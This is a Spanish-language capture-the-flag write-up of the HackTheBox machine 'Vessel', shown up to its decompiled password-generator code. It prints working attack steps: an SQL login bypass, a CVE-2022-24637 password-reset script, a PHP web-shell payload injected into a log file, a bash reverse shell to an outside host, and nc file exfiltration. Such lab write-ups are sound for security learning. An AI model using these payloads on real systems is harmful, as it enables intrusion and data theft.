@@ -1,0 +1,927 @@
+---
+machine_name: Vessel
+platform: HackTheBox
+title: "Máquina Vessel"
+category: writeups
+difficulty: "Difícil"
+description: "Resolución de la máquina Vessel"
+tags: ["Git repo Leak", "Code analysis", "SQLi", "CVE-2022-24637", "pyexe decompilation", "Password guessing", "CVE-2022-0811"]
+---
+
+En esta máquina encontraremos un sitio con un repositorio Git expuesto y analizaremos un código propenso a SQLi que nos permitirá acceder al panel del sitio, luego accederemos a un OpenWebAnalytics vulnerable al CVE-2022-24637 que nos permitirá reiniciar la contraseña del usuario administrador y ganar una consola interactiva en la máquina; ya en esta encontraremos un programa Python compilado con pyinstaller para Windows usado para generar la contraseña de un PDF, pero al no generar contraseñas completamente aleatorias nos dará la contraseña para acceder al documento y encontraremos credenciales por SSH. Finalmente "abusaremos" del CVE-2022-0811 de CRI-O para escalar privilegios.
+
+<h2>RECONOCIMIENTO</h2>
+
+Con un escaneo nmap veremos que la máquina solo tiene dos puertos abiertos.
+
+{% highlight bash %}
+# Nmap 7.93 scan initiated Mon Mar 27 16:07:50 2023 as: nmap -sS -Pn -n -vvv -p- --open --min-rate 100 -oN ports 10.10.11.178
+Nmap scan report for 10.10.11.178
+Host is up, received user-set (0.49s latency).
+Scanned at 2023-03-27 16:07:50 -04 for 132s
+Not shown: 65377 closed tcp ports (reset), 156 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON
+22/tcp open  ssh     syn-ack ttl 63
+80/tcp open  http    syn-ack ttl 63
+
+Read data files from: /usr/bin/../share/nmap
+# Nmap done at Mon Mar 27 16:10:02 2023 -- 1 IP address (1 host up) scanned in 131.58 seconds
+{% endhighlight %}
+
+El sitio web que tiene parece ser de desarrollo y venta de proyectos a pequeñas y grandes compañías:
+
+![Page](/assets/writeups/vessel/1.png)
+
+Usa el dominio "vessel.htb" y tiene un panel de registro y autenticación, pero el de registro está deshabilitado por mantenimiento al parecer
+
+![No register](/assets/writeups/vessel/2.png)
+
+Usa Express con Apache de proxy reverso, pero esto no parece tener alguna cosa interesante por lo que...
+
+<h2>INTRUSIÓN</h2>
+
+Si fuzzeamos la web encontraremos un directorio llamado `dev`
+
+{% highlight bash %}
+#ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -fs 26 -u http://10.10.11.178/FUZZ
+...
+img                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 191ms]
+login                   [Status: 200, Size: 4213, Words: 1929, Lines: 71, Duration: 230ms]
+register                [Status: 200, Size: 5830, Words: 3040, Lines: 90, Duration: 288ms]
+admin                   [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 235ms]
+css                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 206ms]
+Login                   [Status: 200, Size: 4213, Words: 1929, Lines: 71, Duration: 159ms]
+dev                     [Status: 301, Size: 173, Words: 7, Lines: 11, Duration: 679ms]
+js                      [Status: 301, Size: 171, Words: 7, Lines: 11, Duration: 171ms]
+logout                  [Status: 302, Size: 28, Words: 4, Lines: 1, Duration: 126ms]
+404                     [Status: 200, Size: 2393, Words: 999, Lines: 52, Duration: 208ms]
+401                     [Status: 200, Size: 2400, Words: 1029, Lines: 53, Duration: 248ms]
+Register                [Status: 200, Size: 5830, Words: 3040, Lines: 90, Duration: 152ms]
+500                     [Status: 200, Size: 2335, Words: 991, Lines: 52, Duration: 345ms]
+{% endhighlight %}
+
+Intentando entrar por la web simplemente nos retorna un 404, pero este directorio parece existir en la carpeta en donde Apache hostea el contenido y no en el sitio detrás de él, por lo que intentaremos buscar si existen archivos.
+
+Curiosamente aunque nos muestre que la carpeta .git no existe, si intentamos descargárnos el HEAD lo obtendremos sin problemas:
+
+{% highlight bash %}
+❯ curl -v http://10.10.11.178/dev/.git/HEAD
+*   Trying 10.10.11.178:80...
+* Connected to 10.10.11.178 (10.10.11.178) port 80 (#0)
+> GET /dev/.git/HEAD HTTP/1.1
+> Host: 10.10.11.178
+> User-Agent: curl/7.87.0
+> Accept: */*
+> 
+* Mark bundle as not supporting multiuse
+< HTTP/1.1 200 OK
+< Date: Mon, 27 Mar 2023 20:27:02 GMT
+< Server: Apache/2.4.41 (Ubuntu)
+< X-Powered-By: Express
+< Accept-Ranges: bytes
+< Cache-Control: public, max-age=0
+< Last-Modified: Wed, 10 Aug 2022 19:35:57 GMT
+< ETag: W/"17-1828941a548"
+< Content-Type: application/octet-stream
+< Content-Length: 23
+< 
+ref: refs/heads/master
+* Connection #0 to host 10.10.11.178 left intact
+{% endhighlight %}
+
+Al tener archivos de un repositorio utilizaré [git-dumper](https://github.com/arthaud/git-dumper) para descargar los archivos:
+
+{% highlight bash %}
+❯ git-dumper http://10.10.11.178/dev dev
+[-] Testing http://10.10.11.178/dev/.git/HEAD [200]
+[-] Testing http://10.10.11.178/dev/.git/ [302]
+[-] Fetching common files
+[-] Fetching http://10.10.11.178/dev/.gitignore [302]
+[-] http://10.10.11.178/dev/.gitignore responded with status code 302
+[-] Fetching http://10.10.11.178/dev/.git/COMMIT_EDITMSG [200]
+[-] Fetching http://10.10.11.178/dev/.git/description [200]
+[-] Fetching http://10.10.11.178/dev/.git/hooks/applypatch-msg.sample [200]
+[-] Fetching http://10.10.11.178/dev/.git/hooks/commit-msg.sample [200]
+[-] Fetching http://10.10.11.178/dev/.git/hooks/post-commit.sample [302]
+[-] http://10.10.11.178/dev/.git/hooks/post-commit.sample responded with status code 302
+[-] Fetching http://10.10.11.178/dev/.git/hooks/post-receive.sample [302]
+[-] http://10.10.11.178/dev/.git/hooks/post-receive.sample responded with status code 302
+[-] Fetching http://10.10.11.178/dev/.git/hooks/post-update.sample [200]
+[-] Fetching http://10.10.11.178/dev/.git/hooks/pre-applypatch.sample [200]
+[-] Fetching http://10.10.11.178/dev/.git/hooks/pre-push.sample [200]
+[-] Fetching http://10.10.11.178/dev/.git/hooks/pre-rebase.sample [200]
+...
+[-] Running git checkout .
+❯ cd dev
+❯ ls -la
+total 32
+drwxr-xr-x 7 vzon vzon 4096 mar 27 16:33 .
+drwxr-xr-x 3 vzon vzon 4096 mar 27 16:32 ..
+drwxr-xr-x 2 vzon vzon 4096 mar 27 16:33 config
+drwxr-xr-x 7 vzon vzon 4096 mar 27 16:33 .git
+-rw-r--r-- 1 vzon vzon  788 mar 27 16:33 index.js
+drwxr-xr-x 5 vzon vzon 4096 mar 27 16:33 public
+drwxr-xr-x 2 vzon vzon 4096 mar 27 16:33 routes
+drwxr-xr-x 2 vzon vzon 4096 mar 27 16:33 views
+{% endhighlight %}
+
+El repositorio que nos construye es de un proyecto que utiliza Express, es el código del backend de la web. Vamos a husmear un poco...
+
+Analizando el código en busca de vulnerabilidades encontramos credenciales del usuario de la base de datos en el archivo `config/db.js` y una parte interesante de la ruta de autenticación:
+
+{% highlight js %}
+//routes/index.js:60
+...
+router.post('/api/login', function(req, res) {
+	let username = req.body.username;
+	let password = req.body.password;
+	if (username && password) {
+		connection.query('SELECT * FROM accounts WHERE username = ? AND password = ?', [username, password], function(error, results, fields) {
+			if (error) throw error;
+			if (results.length > 0) {
+				req.session.loggedin = true;
+				req.session.username = username;
+				req.flash('success', 'Succesfully logged in!');
+				res.redirect('/admin');
+			} else {
+				req.flash('error', 'Wrong credentials! Try Again!');
+				res.redirect('/login');
+			}			
+			res.end();
+		});
+	} else {
+		res.redirect('/login');
+	}
+});
+...
+{% endhighlight %}
+
+Está usando parametrización de queries pero aún así esto es inseguro, te dejo que pienses que puede estar mal antes de que sigas leyendo.
+
+¿Ya lo captaste? hace falta verificar que tipo de datos se le envia al servidor.
+
+El driver MySQL de Node trata los tipos de JavaScript como son; números son int, cadenas son varchar, decimales son float pero... y los objetos? estos últimos los trata como objetos literalmente.
+
+Los datos por POST que se le envían al servidor son estos:
+
+{% highlight bash %}
+username=pepito&password=123
+{% endhighlight %}
+
+Dos varchars, esto en SQL sería traducido a
+
+{% highlight sql %}
+SELECT * FROM users WHERE username = "pepito" AND password = "123";
+{% endhighlight %}
+
+Vale todo normal, pero ahora como se vería si metiera un objeto?
+
+{% highlight sql %}
+SELECT * FROM users WHERE username = "pepito" AND password = `key` = "value";
+{% endhighlight %}
+
+Jugemos un poco más
+
+{% highlight sql %}
+SELECT * FROM users WHERE username = "pepito" AND password = `password` = 1;
+{% endhighlight %}
+
+Esto en SQL es completamente válido, y la última query sería tomada por el servidor como una condición verdadera porque está comparando una columna con un 1 (true), por lo que para poder explotar esto habría que introducir un objeto a la query por POST, sería similar a esto en formato de formulario URL:
+
+{% highlight bash %}
+username=pepito&password[password]=1
+{% endhighlight %}
+
+Cambiando el parametro user a "admin" y enviando la petición el servidor nos concede el acceso a un panel de administración
+
+![Admin](/assets/writeups/vessel/3.png)
+
+Husmeando por las funciones del panel encontramos una parte de "Analytics" en la barra de perfil; si le damos click nos manda al subdominio "openwebanalytics.vessel.htb"
+
+![OWA](/assets/writeups/vessel/4.png)
+
+Es un portal Open Web Analytics para estadísticas de sitios web, si husmeamos por el código veremos que usa la versión 1.7.3 y esta es vulnerable al [CVE-2022-24637](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24637)... existe un script en ExploitDB para explotar esta vulnerabilidad y conseguir un RCE pero aquí vamos a explotarlo manualmente.
+
+Primero que nada, esta vulnerabilidad ocurre porque el interprete de PHP no trata bien las secuencias que inician con '<?php, y en un mal intento de ocultar el caché de los usuarios usando esta secuencia queda expuesto publicamente... con esto último puedes cambiarles la contraseña ya que al hacer aunque sea un intento de inicio de sesión fallido el caché se genera con una contraseña temporal dentro.
+
+Vamos a autenticarnos como el usuario admin para generarle un cache:
+
+{% highlight bash %}
+❯ curl -v -d "owa_user_id=admin&owa_password=admin&owa_action=base.login" 'http://openwebanalytics.vessel.htb/index.php?owa_do=base.loginForm'
+{% endhighlight %}
+
+El caché generado puedes encontrarlo en la ruta `/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php`. El hash que ves en la ruta es de tipo md5 hex y es el resultado de la combinación `user_id1`; La ID del usuario administrador es 1.
+
+Haciendo una petición a esa ruta encontraremos el caché:
+
+{% highlight bash %}
+❯ curl 'http://openwebanalytics.vessel.htb/owa-data/caches/1/owa_user/c30da9265ba0a4704db9229f864c9eb7.php'
+<?php\n/*Tzo4OiJvd2FfdXNlciI6NTp7czo0OiJuYW1lIjtzOjk6ImJhc2UudXNlciI7czoxMDoicHJvcGVydGllcyI7YToxMDp7czoyOiJpZCI7TzoxMjoib3dhX2RiQ29sdW1uIjoxMTp7czo0OiJuYW1lIjtOO3M6NToidmFsdWUiO3M6MToiMSI...
+{% endhighlight %}
+
+Decodificando el base64 vemos que es un objeto PHP "owa_user" serializado y si vemos bien encontraremos la contraseña temporal:
+
+{% highlight php %}
+...ss:12:"temp_passkey";O:12:"owa_dbColumn":11:{s:4:"name";N;s:5:"value";s:32:"0acfc1e6455e1a57d57385f7e1fae3b8"...
+{% endhighlight %}
+
+*NOTA: También está el hash de la contraseña actual pero no nos interesa por ahora*
+
+Luego haremos una petición a la URL `http://openwebanalytics.vessel.htb/index.php?owa_do=base.usersPasswordEntry` por POST para reiniciar la contraseña de admin, yo usaré este script feo para hacerlo:
+
+{% highlight bash %}
+#!/bin/bash
+#El archivo "cache" es el cache obtenido codificado en base64.
+
+temppass=$(base64 -d cache | grep -oP "N;s:5:\"value\";s:32:\"\K.{32}")
+
+echo "Temporal password is $temppass"
+echo "See the request"
+
+curl -v -d "owa_password=admin&owa_password2=admin&owa_k=$temppass&owa_action=base.usersChangePassword" 'http://openwebanalytics.vessel.htb/index.php?owa_do=base.usersPasswordEntry'
+{% endhighlight %}
+
+Después de ejecutarla e ir al sitio donde nos manda el aplicativo nos dice que:
+
+![Sucess](/assets/writeups/vessel/5.png)
+
+Ahora simplemente iniciamos sesión con la contraseña que especificamos en la petición anterior y boom
+
+![OWA 2](/assets/writeups/vessel/6.png)
+
+Vamos a obtener un RCE ahora para ganar acceso como www-data, para esto modificaremos los ajustes de la generación de logs del aplicativo.
+
+Primero necesitaremos la ubicación de los logs, según el sitio es:
+
+![OWA logs](/assets/writeups/vessel/7.png)
+
+En el servidor web sería reflejado como `http://openwebanalytics.vessel.htb/owa-data/logs/`, vale... ahora vamos a alterar el formato de generación de logs aprovechandonos de una falla de asignación en masa, para esto necesitaremos interceptar las peticiones que se hacen cuando cambiamos ajustes. Esto se envia por POST cuando hacemos dicha acción:
+
+{% highlight bash %}
+owa_config%5Bbase.resolve_hosts%5D=0&owa_config%5Bbase.log_feedreaders%5D=1&owa_config%5Bbase.log_robots%5D=0&owa_config%5Bbase.log_named_users%5D=1&owa_config%5Bbase.excluded_ips%5D=%2C&owa_config%5Bbase.anonymize_ips%5D=0&owa_config%5Bbase.fetch_refering_page_info%5D=1&owa_config%5Bbase.p3p_policy%5D=NOI+ADM+DEV+PSAi+COM+NAV+OUR+OTRo+STP+IND+DEM&owa_config%5Bbase.query_string_filters%5D=%2C&owa_config%5Bbase.announce_visitors%5D=0&owa_config%5Bbase.notice_email%5D=admin%40vessel.htb&owa_config%5Bbase.geolocation_lookup%5D=1&owa_config%5Bbase.track_feed_links%5D=1&owa_config%5Bbase.async_log_dir%5D=%2Fvar%2Fwww%2Fhtml%2Fowa%2Fowa-data%2Flogs%2F&owa_config%5Bbase.timezone%5D=America%2FLos_Angeles&owa_nonce=5a038d6bf2&owa_action=base.optionsUpdate&owa_module=base
+{% endhighlight %}
+
+Si agregamos `base.error_log_file` y `base.error_log_level` aunque no estén en el formulario original de configuración, los va a actualizar.
+
+{% highlight bash %}
+owa_config%5Bbase.resolve_hosts%5D=0&owa_config%5Bbase.log_feedreaders%5D=1&owa_config%5Bbase.log_robots%5D=0&owa_config%5Bbase.log_named_users%5D=1&owa_config%5Bbase.excluded_ips%5D=%2C&owa_config%5Bbase.anonymize_ips%5D=0"&owa_config%5Bbase.error_log_level%5D=2&owa_config%5Bbase.error_log_file%5D=/var/www/html/owa/owa-data/logs/myfile.php"&owa_config%5Bbase.fetch_refering_page_info%5D=1&owa_config%5Bbase.p3p_policy%5D=NOI+ADM+DEV+PSAi+COM+NAV+OUR+OTRo+STP+IND+DEM&owa_config%5Bbase.query_string_filters%5D=%2C&owa_config%5Bbase.announce_visitors%5D=0&owa_config%5Bbase.notice_email%5D=admin%40vessel.htb&owa_config%5Bbase.geolocation_lookup%5D=1&owa_config%5Bbase.track_feed_links%5D=1&owa_config%5Bbase.async_log_dir%5D=%2Fvar%2Fwww%2Fhtml%2Fowa%2Fowa-data%2Flogs%2F&owa_config%5Bbase.timezone%5D=America%2FLos_Angeles&owa_nonce=5a038d6bf2&owa_action=base.optionsUpdate&owa_module=base
+{% endhighlight %}
+
+El sitio guardará los ajustes sin problemas y si intentamos ver si el archivo nuevo de logs existe pues
+
+![Logging](/assets/writeups/vessel/8.png)
+
+Ahora solamente tenemos que hacer un intento de autenticación con algún código PHP de nombre de usuario, al hacerlo el sitio interpretará eso como código:
+
+{% highlight bash %}
+❯ curl -v -d "owa_user_id=<%3fphp+echo+system(\$_GET['cmd'])%3b+%3f>&owa_password=<%3fphp+echo+system(\$_GET['cmd'])%3b+%3f>&owa_action=base.login" 'http://openwebanalytics.vessel.htb/index.php?owa_do=base.loginForm'
+{% endhighlight %}
+
+![Pwned](/assets/writeups/vessel/9.png)
+
+Introduzcamos nuestro tipico one liner de bash para ganar acceso:
+
+`http://openwebanalytics.vessel.htb/owa-data/logs/myfile.php?cmd=bash+-c+%22bash+-i+%3E%26+/dev/tcp/10.10.14.82/443+0%3E%261%22`
+
+{% highlight bash %}
+❯ nc -lvnp 443
+Connection from 10.10.11.178:59176
+bash: cannot set terminal process group (1010): Inappropriate ioctl for device
+bash: no job control in this shell
+www-data@vessel:/var/www/html/owa/owa-data/logs$ script /dev/null -c bash #Inicia un nuevo proceso
+script /dev/null -c bash
+Script started, file is /dev/null
+www-data@vessel:/var/www/html/owa/owa-data/logs$ ^Z #CTRL+Z
+[1]  + 21881 suspended  nc -lvnp 443
+❯ stty raw -echo; fg
+[1]  + 21881 continued  nc -lvnp 443
+                                    reset xterm #Reiniciar la terminal
+www-data@vessel:/var/www/html/owa/owa-data/logs$ export TERM=xterm #Establecer el tipo de terminal
+www-data@vessel:/var/www/html/owa/owa-data/caches$ stty rows 37 columns 151 #Establecer filas y columnas de la tty
+{% endhighlight %}
+
+Husmeando el contenido de la maquina encontramos dos usuarios, y tenemos permisos de lectura en el directorio de uno:
+
+{% highlight bash %}
+www-data@vessel:/home$ ls -la
+total 16
+drwxr-xr-x  4 root   root   4096 Aug 11  2022 .
+drwxr-xr-x 19 root   root   4096 Aug 11  2022 ..
+drwx------  5 ethan  ethan  4096 Aug 11  2022 ethan
+drwxrwxr-x  3 steven steven 4096 Aug 11  2022 steven
+{% endhighlight%}
+
+En la carpeta personal de steven hay un archivo llamado passwordGenerator que es un ejecutable PE32 para Windows
+
+{% highlight bash %}
+www-data@vessel:/home/steven$ ls -la
+total 33796
+drwxrwxr-x 3 steven steven     4096 Aug 11  2022 .
+drwxr-xr-x 4 root   root       4096 Aug 11  2022 ..
+lrwxrwxrwx 1 root   root          9 Apr 18  2022 .bash_history -> /dev/null
+-rw------- 1 steven steven      220 Apr 17  2022 .bash_logout
+-rw------- 1 steven steven     3771 Apr 17  2022 .bashrc
+drwxr-xr-x 2 ethan  steven     4096 Aug 11  2022 .notes
+-rw------- 1 steven steven      807 Apr 17  2022 .profile
+-rw-r--r-- 1 ethan  steven 34578147 May  4  2022 passwordGenerator
+www-data@vessel:/home/steven$ file passwordGenerator
+passwordGenerator: PE32 executable (console) Intel 80386, for MS Windows
+{% endhighlight %}
+
+También hay un directorio `.notes` que contiene un documento PDF y una imagen PNG, vamos a descargarnos esto
+
+{% highlight bash %}
+www-data@vessel:/home/steven/.notes$ ls
+notes.pdf  screenshot.png
+www-data@vessel:/home/steven/.notes$ cat notes.pdf | nc 10.10.14.82 443 #Inicio un listener en mi máquina y mando el archivo al listener.
+^C
+www-data@vessel:/home/steven/.notes$ cat screenshot.png | nc 10.10.14.82 443
+^C
+{% endhighlight %}
+
+La imagen simplemente es una captura de lo que puede ser el programa passwordGenerator que vimos anteriormente
+
+![Passwords](/assets/writeups/vessel/screenshot.png)
+
+Mientras que el PDF está protegido con contraseña... pero con cuál contraseña? probablemente una generada con este programa que estamos viendo.
+
+Si hacemos un poco de ingeniería inversa a este artefacto pasándolo a nuestra máquina y miramos sus cadenas imprimibles con `strings` encontramos algo interesante:
+
+{% highlight bash %}
+❯ strings passwordGenerator.exe | tail -n 30
+bselect.pyd
+bshiboken2.abi3.dll
+bshiboken2\shiboken2.pyd
+bunicodedata.pyd
+xPySide2\translations\qtbase_ar.qm
+xPySide2\translations\qtbase_bg.qm
+xPySide2\translations\qtbase_ca.qm
+xPySide2\translations\qtbase_cs.qm
+xPySide2\translations\qtbase_da.qm
+xPySide2\translations\qtbase_de.qm
+xPySide2\translations\qtbase_en.qm
+xPySide2\translations\qtbase_es.qm
+xPySide2\translations\qtbase_fi.qm
+xPySide2\translations\qtbase_fr.qm
+xPySide2\translations\qtbase_gd.qm
+xPySide2\translations\qtbase_he.qm
+xPySide2\translations\qtbase_hu.qm
+xPySide2\translations\qtbase_it.qm
+xPySide2\translations\qtbase_ja.qm
+xPySide2\translations\qtbase_ko.qm
+xPySide2\translations\qtbase_lv.qm
+xPySide2\translations\qtbase_pl.qm
+xPySide2\translations\qtbase_ru.qm
+xPySide2\translations\qtbase_sk.qm
+xPySide2\translations\qtbase_tr.qm
+xPySide2\translations\qtbase_uk.qm
+xPySide2\translations\qtbase_zh_TW.qm
+xbase_library.zip
+zPYZ-00.pyz
+3python37.dll
+{% endhighlight %}
+
+Tiene un DLL de Python 3.7 incluido junto a unos archivos de PySide2 por lo que este programa pudo haber sido antes un simple proyecto de Python que fue compilado con [pyinstaller](https://pypi.org/project/pyinstaller/). Afortunadamente existe una herramienta llamada [pyinstextractor](https://github.com/extremecoders-re/pyinstxtractor) para extraer los recursos de este tipo de programas.
+
+Al utilizarla nos extrae mucho contenido:
+
+{% highlight bash %}
+❯ python pyinstxtractor.py passwordGenerator.exe
+[+] Processing passwordGenerator.exe
+[+] Pyinstaller version: 2.1+
+[+] Python version: 3.7
+[+] Length of package: 34300131 bytes
+[+] Found 95 files in CArchive
+[+] Beginning extraction...please standby
+[+] Possible entry point: pyiboot01_bootstrap.pyc
+[+] Possible entry point: pyi_rth_subprocess.pyc
+[+] Possible entry point: pyi_rth_pkgutil.pyc
+[+] Possible entry point: pyi_rth_inspect.pyc
+[+] Possible entry point: pyi_rth_pyside2.pyc
+[+] Possible entry point: passwordGenerator.pyc
+[!] Warning: This script is running in a different Python version than the one used to build the executable.
+[!] Please run this script in Python 3.7 to prevent extraction errors during unmarshalling
+[!] Skipping pyz extraction
+[+] Successfully extracted pyinstaller archive: passwordGenerator.exe
+❯ ls -la passwordGenerator.exe_extracted
+total 62792
+drwxr-xr-x 5 vzon vzon     4096 mar 28 15:13 .
+drwxr-xr-x 3 vzon vzon     4096 mar 28 15:13 ..
+-rw-r--r-- 1 vzon vzon   796140 mar 28 15:13 base_library.zip
+-rw-r--r-- 1 vzon vzon    78352 mar 28 15:13 _bz2.pyd
+-rw-r--r-- 1 vzon vzon   104976 mar 28 15:13 _ctypes.pyd
+-rw-r--r-- 1 vzon vzon  3706048 mar 28 15:13 d3dcompiler_47.dll
+-rw-r--r-- 1 vzon vzon    32272 mar 28 15:13 _hashlib.pyd
+-rw-r--r-- 1 vzon vzon  2228256 mar 28 15:13 libcrypto-1_1.dll
+-rw-r--r-- 1 vzon vzon    27928 mar 28 15:13 libEGL.dll
+-rw-r--r-- 1 vzon vzon  2942232 mar 28 15:13 libGLESv2.dll
+-rw-r--r-- 1 vzon vzon   537632 mar 28 15:13 libssl-1_1.dll
+-rw-r--r-- 1 vzon vzon   146960 mar 28 15:13 _lzma.pyd
+-rw-r--r-- 1 vzon vzon    28952 mar 28 15:13 MSVCP140_1.dll
+-rw-r--r-- 1 vzon vzon   435600 mar 28 15:13 MSVCP140.dll
+-rw-r--r-- 1 vzon vzon 15995904 mar 28 15:13 opengl32sw.dll
+-rw-r--r-- 1 vzon vzon     7910 mar 28 15:13 passwordGenerator.pyc
+...
+{% endhighlight %}
+
+Ahora tenemos un conjunto de archivos pyc que se pueden decompilar, entre ellos el más interesante es el `passwordGenerator.pyc` por lo que vamos a decompilarlo usando una [herramienta web](https://www.toolnb.com/tools-lang-en/pyc.html):
+
+{% highlight python %}
+# uncompyle6 version 3.5.0
+# Python bytecode 3.7 (3394)
+# Decompiled from: Python 2.7.5 (default, Nov 16 2020, 22:23:17) 
+# [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]
+# Embedded file name: passwordGenerator.py
+from PySide2.QtCore import *
+from PySide2.QtGui import *
+from PySide2.QtWidgets import *
+from PySide2 import QtWidgets
+import pyperclip
+
+class Ui_MainWindow(object):
+
+    def setupUi(self, MainWindow):
+        if not MainWindow.objectName():
+            MainWindow.setObjectName('MainWindow')
+        MainWindow.resize(560, 408)
+        self.centralwidget = QWidget(MainWindow)
+        self.centralwidget.setObjectName('centralwidget')
+        self.title = QTextBrowser(self.centralwidget)
+        self.title.setObjectName('title')
+        self.title.setGeometry(QRect(80, 10, 411, 51))
+        self.textBrowser_2 = QTextBrowser(self.centralwidget)
+        self.textBrowser_2.setObjectName('textBrowser_2')
+        self.textBrowser_2.setGeometry(QRect(10, 80, 161, 41))
+        self.generate = QPushButton(self.centralwidget)
+        self.generate.setObjectName('generate')
+        self.generate.setGeometry(QRect(140, 330, 261, 51))
+        self.PasswordLength = QSpinBox(self.centralwidget)
+        self.PasswordLength.setObjectName('PasswordLength')
+        self.PasswordLength.setGeometry(QRect(30, 130, 101, 21))
+        self.PasswordLength.setMinimum(10)
+        self.PasswordLength.setMaximum(40)
+        self.copyButton = QPushButton(self.centralwidget)
+        self.copyButton.setObjectName('copyButton')
+        self.copyButton.setGeometry(QRect(460, 260, 71, 61))
+        self.textBrowser_4 = QTextBrowser(self.centralwidget)
+        self.textBrowser_4.setObjectName('textBrowser_4')
+        self.textBrowser_4.setGeometry(QRect(190, 170, 141, 41))
+        self.checkBox = QCheckBox(self.centralwidget)
+        self.checkBox.setObjectName('checkBox')
+        self.checkBox.setGeometry(QRect(250, 220, 16, 17))
+        self.checkBox.setCheckable(True)
+        self.checkBox.setChecked(False)
+        self.checkBox.setTristate(False)
+        self.comboBox = QComboBox(self.centralwidget)
+        self.comboBox.addItem('')
+        self.comboBox.addItem('')
+        self.comboBox.addItem('')
+        self.comboBox.setObjectName('comboBox')
+        self.comboBox.setGeometry(QRect(350, 130, 161, 21))
+        self.textBrowser_5 = QTextBrowser(self.centralwidget)
+        self.textBrowser_5.setObjectName('textBrowser_5')
+        self.textBrowser_5.setGeometry(QRect(360, 80, 131, 41))
+        self.password_field = QLineEdit(self.centralwidget)
+        self.password_field.setObjectName('password_field')
+        self.password_field.setGeometry(QRect(100, 260, 351, 61))
+        MainWindow.setCentralWidget(self.centralwidget)
+        self.statusbar = QStatusBar(MainWindow)
+        self.statusbar.setObjectName('statusbar')
+        MainWindow.setStatusBar(self.statusbar)
+        self.retranslateUi(MainWindow)
+        QMetaObject.connectSlotsByName(MainWindow)
+
+    def retranslateUi(self, MainWindow):
+        MainWindow.setWindowTitle(QCoreApplication.translate('MainWindow', 'MainWindow', None))
+        self.title.setDocumentTitle('')
+        self.title.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:20pt;">Secure Password Generator</span></p></body></html>', None))
+        self.textBrowser_2.setDocumentTitle('')
+        self.textBrowser_2.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:14pt;">Password Length</span></p></body></html>', None))
+        self.generate.setText(QCoreApplication.translate('MainWindow', 'Generate!', None))
+        self.copyButton.setText(QCoreApplication.translate('MainWindow', 'Copy', None))
+        self.textBrowser_4.setDocumentTitle('')
+        self.textBrowser_4.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:14pt;">Hide Password</span></p></body></html>', None))
+        self.checkBox.setText('')
+        self.comboBox.setItemText(0, QCoreApplication.translate('MainWindow', 'All Characters', None))
+        self.comboBox.setItemText(1, QCoreApplication.translate('MainWindow', 'Alphabetic', None))
+        self.comboBox.setItemText(2, QCoreApplication.translate('MainWindow', 'Alphanumeric', None))
+        self.textBrowser_5.setDocumentTitle('')
+        self.textBrowser_5.setHtml(QCoreApplication.translate('MainWindow', '<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0//EN" "http://www.w3.org/TR/REC-html40/strict.dtd">\n<html><head><meta name="qrichtext" content="1" /><style type="text/css">\np, li { white-space: pre-wrap; }\n</style></head><body style=" font-family:\'MS Shell Dlg 2\'; font-size:8.25pt; font-weight:400; font-style:normal;">\n<p align="center" style=" margin-top:0px; margin-bottom:0px; margin-left:0px; margin-right:0px; -qt-block-indent:0; text-indent:0px;"><span style=" font-size:16pt;">characters</span></p></body></html>', None))
+        self.password_field.setText('')
+
+
+class MainWindow(QMainWindow, Ui_MainWindow):
+
+    def __init__(self):
+        super(MainWindow, self).__init__()
+        self.setupUi(self)
+        self.setFixedSize(QSize(550, 400))
+        self.setWindowTitle('Secure Password Generator')
+        self.password_field.setReadOnly(True)
+        self.passlen()
+        self.chars()
+        self.hide()
+        self.gen()
+
+    def passlen(self):
+        self.PasswordLength.valueChanged.connect(self.lenpass)
+
+    def lenpass(self, l):
+        global value
+        value = l
+
+    def chars(self):
+        self.comboBox.currentIndexChanged.connect(self.charss)
+
+    def charss(self, i):
+        global index
+        index = i
+
+    def hide(self):
+        self.checkBox.stateChanged.connect(self.status)
+
+    def status(self, s):
+        global status
+        status = s == Qt.Checked
+
+    def copy(self):
+        self.copyButton.clicked.connect(self.copied)
+
+    def copied(self):
+        pyperclip.copy(self.password_field.text())
+
+    def gen(self):
+        self.generate.clicked.connect(self.genButton)
+
+    def genButton(self):
+        try:
+            hide = status
+            if hide:
+                self.password_field.setEchoMode(QLineEdit.Password)
+            else:
+                self.password_field.setEchoMode(QLineEdit.Normal)
+            password = self.genPassword()
+            self.password_field.setText(password)
+        except:
+            msg = QMessageBox()
+            msg.setWindowTitle('Warning')
+            msg.setText('Change the default values before generating passwords!')
+            x = msg.exec_()
